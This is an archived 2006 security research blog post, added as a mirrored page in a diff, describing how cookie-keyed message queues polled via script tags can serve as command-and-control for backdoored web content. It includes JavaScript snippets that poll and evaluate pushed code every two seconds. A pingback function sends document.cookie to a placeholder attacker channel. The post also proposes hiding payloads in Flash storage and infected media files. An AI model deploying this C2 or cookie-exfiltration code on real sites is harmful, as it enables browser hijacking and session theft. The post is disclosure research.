@@ -1,0 +1,276 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/persistent-bi-directional-communication-channels/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:23:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Persistent Bi-directional Communication Channels</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Persistent Bi-directional Communication Channels Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='JavaScript Attack Channel' href='../javascript-attack-channel/index.html' />
+<link rel='next' title='Google Search API Worms 2' href='../google-search-api-worms-2/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index7896.html?p=78' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-78" class="post">
+	<div class="post-title"><h2><span>Persistent Bi-directional Communication Channels</span></h2></div>
+	<div class="post-date"><span>published:</span> October 2nd, 2006</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>In this article I am planning to cover the essence of the my <q>Persistent Bi-directional Communication Channels</q> research and how they can be used to track and control networks of backdoored web client objects. There is also demonstration tool available as well. The tool is written in PHP and can be downloaded from its project page <a href="../javascript-attack-channel/index.html">here</a>. First let&#8217;s have a look at the structure of the HTTP protocol and the theory behind bi-directional communication in stateless protocols in order to understand what these channels are and why they are interesting to study.</p>
+
+<p>HTTP is a stateless protocol. This means that HTTP servers don&#8217;t know for sure whether the same client is requesting resources from them. The reason for this is quite simple. At the very beginning HTTP was designed to serve static pages only. Dynamic content was added latter and the need for keeping state soon became a problem. Also, there was a problem with users coming from NATed networks. In simple words, there was no easy way to differentiate NATed client requests. That was until cookies were introduced. So eventually <q>persistence</q> became synonym for cookies in the HTTP world.</p>
+
+<blockquote>In addition to that HTTP is no longer stateless. It can be stateful as well and act the same way like other protocols. This is achieved through combination of various HTTP headers that need to be supported by both the server and the client. Also it is worth mentioning that other technologies such as Java and Flash can be used to persist state as well as we will see later in this article.</blockquote>
+
+<p>While persistency is achieved with cookies, bi-directional communication in stateless protocols is achieved with broadcast request handlers. The purpose of these handlers is to route messages. As such client A contacts the request handler to queue a message for client B. Since the server handler keeps state with A and B, the message can be properly routed. The whole idea is quite similar to the one implemented in many well known network routing protocols.</p>
+
+<p>In the HTTP world there is no such thing as broadcast and multicast as in the world of routing protocols but these concepts can be emulated in many different ways. Persistent Bi-directional Communication Channels are simply server side HTTP request handlers that keep state between clients with cookies and communicate with them via message queues and a pulling mechanism. I have seen a lot of different implementations of these channels. Web based instant messengers are some of them. They offer facility to queue messages for others that will be pulled as soon as possible. All this is based on taming mechanisms which makes the process not instant but this is how it is done today in AJAX.</p>
+
+<p>It is very important to understand that instance messaging has some quite powerful characteristic that are widely used today as a mechanism to control malware. The communication channel in use is IRC (stateful) usually but others are possible as well. One of these characteristics is anonymity. Since IRC channels are designed for people to hang out there is no easy way to differentiate which of them are bots and which are humans sitting behind computers.</p>
+
+<p>Web malware cannot use IRC because of practical limitations, however depending how the communication channel is composed, the malware can use web based instant messengers in the same way bots are using IRC channels. However it must be noted that web objects are restricted by a sandbox. Sending information is quite simple. GET or POST can be quite easily achieved in many different ways. Pulling information is not that trivial though. For example using <code>XMLHttpRequest</code> and iframe is impossible unless the client originates from the same domain, port and protocol as the channel and that is not practical. Flash used to be the savior in this case but today Flash is restricted by crossdomain.xml which has to be served from the server where the communication channel is located. That again is not practical. The last resort is to use SCRIPT elements. IMHO this is the most functional scenario since SCRIPT elements allow communication in cross domain manner. This technique is widely used today and most people know it as <a href="http://www.json.org/">JSON</a>.</p>
+
+<blockquote>In summary, every communication channel that persists state with cookies, queues messages for clients and interact with them via <a href="http://www.json.org/">JSON</a> may be exploited by web malware as prime communication mechanism between masters and zombies in a similar way to IRC.</blockquote>
+
+<p>For testing purposes I constructed a tool that is designed to control backdoored web content and the client that currently previews it. In the second part of this post I will explain what this tool does and how it can be used.</p>
+
+<p>In order to achieve bi-directional communication in persistent fashion my tool makes use of push and pull mechanism via <code>HTTP GET</code> requests. Every client is defined by an identifier which in fact corresponds to their session identifier defined by a cookie. Pushing messages is as simple as making a GET request to an URL. For example:</p>
+
+<pre><code>var img = new Image();
+img.src = 'http://path/to/channel.php?action=push&#038;client=&lt;session_id&gt;&#038;message=alert("Hi There");';</code></pre>
+
+<p>The code above queues the message alert(&#8220;Hi There&#8221;); for the client defined by client_id. Once the message is in the queue it has to be pulled. The server cannot just send the message to the client because there is no state. The client defined by client_id has to query the server on regular basis for new messages. For example:</p>
+
+<pre><code>setInterval(function () {
+var script = document.createElement('script');
+script.src = 'http://path/to/channel.php?action=pull';
+script.differ = true;
+script.type = 'text/javascript';
+script.onload = function () {
+document.body.removeChild(script);
+}
+document.body.appendChild(script);
+}, 2000);</code></pre>
+
+<p>Every two second a new request to <code>http://path/to/channel.php?action=pull</code> will be made to pull messages stored in the queue. These messages are evaluated as JavaScript. The server recognizes the client via the session cookie stored for it in the browser context. It is also possible to use <code>http://path/to/channel.php</code> instead of  http://path/to/channel.php?action=pull since this is the default action that will be executed from <code>channel.php</code> server script.</p>
+
+<p>Because clients are recognized by their cookies attackers may want to keep them open for longer. In that respect the server would keep open sessions for more than a year for example. That of course can be set in the tool&#8217;s configuration section. However, there is one minor problem. Because the session is open for a year there is no direct way to check if clients are available to attack. In order to solve this restriction, attackers can implement pingback mechanism on the top of the communication channel. This can be achieved in the following way:</p>
+
+<pre><code>function pingback(session_id) {
+var img = new Image();
+img.src = 'http://path/to/channel.php?action=push&#038;client=' + session_id + '&#038;message=ping_receive("' + document.cookie + '")';
+}</code></pre>
+
+<p>The function described above needs to be pushed to the client via <code>channel.php?action=push</code>. Than the attacker needs to push a call to that function in the same way it was described earlier in this article:</p>
+
+<pre><code>var img = new Image();
+img.src = 'http://path/to/channel.php?action=push&#038;client=&lt;session_id&gt;&#038;message=pingback("' + document.cookie + '");';</code></pre>
+
+<p>If the client is visible the function <code>ping_receive</code> will be informed on the attacker&#8217;s side.</p>
+
+<p>You may have already noticed that the process of pushing and pulling events from the channel abuses standard elements from the XHTML/HTML context. Image objects will result in GET request while SCRIPT elements result in evaluated code from the result body. Instead of writing the same thing all over again, the process can be simplified by creating generic function for example:</p>
+
+<pre><code>function push_message(to, message) {
+var img = new Image();
+img.src = 'http://path/to/channel.php?action=push&#038;client=' + to + '&#038;message=' + message + ';
+}</code></pre>
+
+<p>The code above simplifies the process by wrapping the push functionality in function called <code>push_message</code>. This function together with the pulling mechanism described earlier can be part of a malicious payload that a media file is infected with for example.</p>
+
+<p>The need to push functionalities down to clients is inevitable. They can store web based keylogging software, port and network scanners, exploits and other attack scripts. Pushing code every time something needs to be done is not efficient. In this case persistent storage mechanism is required.</p>
+
+<p>I have already discussed this issue in several of my previous post but I will mention it here again. Attackers can push code and save it on the client via the Persistent <a href="http://codinginparadise.org/projects/storage/README.html">Flash Storage Model</a>. This technique provides around 100K storage capabilities that can contain plenty of functionalities in compressed JavaScript format. More over, unaware users cannot trivially delete it. Clearing the cookies will not clear the persistent storage. This mechanism is quite suitable for covert channels or for a storage place where malicious code can be resurrect from upon visit of a malicious domain.</p>
+
+<p>This is very good time to mention that once the infected user clears their cookies the persistent communication will be lost. As I said earlier the process relies on cookies. Since the Persistent Flash Storage Model is not cleared, this is the place where attackers may want to store the session identifier as well and use it in the following way when pulling messages from the message queue.</p>
+
+<pre><code>setInterval(function () {
+var script = document.createElement('script');
+script.src = 'http://path/to/channel.php?action=pull&#038;client=' + client_id;
+script.differ = true;
+script.type = 'text/javascript';
+script.onload = function () {
+document.body.removeChild(script);
+}
+document.body.appendChild(script);
+}, 2000);</code></pre>
+
+<p>The source code above uses client_id as the session identifier that is retrieved from the persistent storage. As long as the affected client has Flash installed the persistent channel will stay open and ready for use.</p>
+
+<p>It is one thing to use Persistent Bi-directional Communication Channels but it is completely different to understand the purposes of this technology. In the third section of this article I will discuss in brief some potential attack vectors that are likely to be exploited in the near future. For more information how to use the tool described in this article please visit its homepage located <a href="../javascript-attack-channel/index.html">here</a>.</p>
+
+<p>So how malicious minds can exploit this mechanism in the near future? Some of you may already know the answer to this question. It is definitely possible to construct tools similar to Back Orifice and Subseven but designed to work with the web. Actually, they are easier to construct today. If the channel is suitable for communication and persists state in the desired way all the attacker needs to do is put an AJAX interface on the top of it and the job is done. In fact I have already had one that will become part of <a href="../attackapi/index.html">AttackAPI</a> project in the 0.8 release.</p>
+
+<p>Attackers are also able to exploit not only persistent and non-persistent Cross-site Scripting attacks in popular websites via Cross-site Request Forgery and social engineering but also by altering media content such as <a href="../backdooring-flash-objects-receipt/index.html">Flash</a>, <a href="../backdooring-mp3-files/index.html">Music</a> and <a href="../backdooring-quicktime-movies/index.html">Video</a> formats. More over this can be now done from the browser if data URLs are supported. Attackers may not have complete control of your PC for now but they may have in the near future.</p>
+
+<p>If an attacker controls about 100 media files already maliciously infected with the payloads I described earlier in this article and these files are well distributed around the web, they may already have control of your PC by exploiting the browser via IE VML vulnerability or the new Firefox JavaScript engine vulnerability. They are even able to push down to your PC any type of malicious code in distributed fashion. Distributed Denial of Service attacks are also possible and in fact they much easier to construct than one can imagine.</p>
+
+<p><em>The big picture is even worse than what I can explain in simple words. Sites such as DIGG, YouTube, MySpace, Google and Google Videos, Del.icio.us and many more will help for this content to get distributed even faster and maybe even reach targets of a high importance (military and government networks, investigation bureaus and VIPs). Although self distribution is now possible via <a href="../google-search-api-worms/index.html">Google AJAX Search API</a> the problem will worsen when people unintentionally help the process as well. This will potentially exploit trust as well in many different ways.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	</div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-186">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/96da1b3d8858bfa0306b7c55d3e48270?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://codinginparadise.org/' rel='external nofollow' class='url'>Brad Neuberg</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-186">
+			October 4, 2006 at 8:36 pm</a>		</div>
+
+		<p>This is interesting but I&#8217;d like to see an actual working example. My Dojo Storage flash code, for example, must be invoked and loaded on page load since it depends on a document.write; I&#8217;m not sure if a dynamic SCRIPT tag could invoke it and set it up. If the original domain already has Dojo Storage or the given flash file then that is one thing, but what if it doesn&#8217;t?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-188">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-188">
+			October 5, 2006 at 2:34 am</a>		</div>
+
+		<p>Hi Brad,</p>
+<p>I am planning to write hacked version of Flash Storage model soon. In this article I am presenting the technique and the theory behind it. Of course that is not sufficient.</p>
+<p>Soon there will be an examples as well and I am planning to do this in the 0.9 release of AttackAPI. Thanks for the comment.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-194">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/96da1b3d8858bfa0306b7c55d3e48270?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Brad Neuberg</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-194">
+			October 5, 2006 at 1:58 pm</a>		</div>
+
+		<p>The reason I say this is the devil is in the details when it comes to JavaScript Flash communication, so the theory might not work in practice (which Im hoping ;)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-200">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-200">
+			October 6, 2006 at 2:32 am</a>		</div>
+
+		<p>Brad, very good point. I have a few more things to finish before going into this issue. I get the feeling that it is possible but than again I&#8217;ve been wrong before, so you are right: the theory might not work in practice. Let&#8217;s see.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="78"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="ea3f7e9339" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/persistent-bi-directional-communication-channels/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:23:02 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
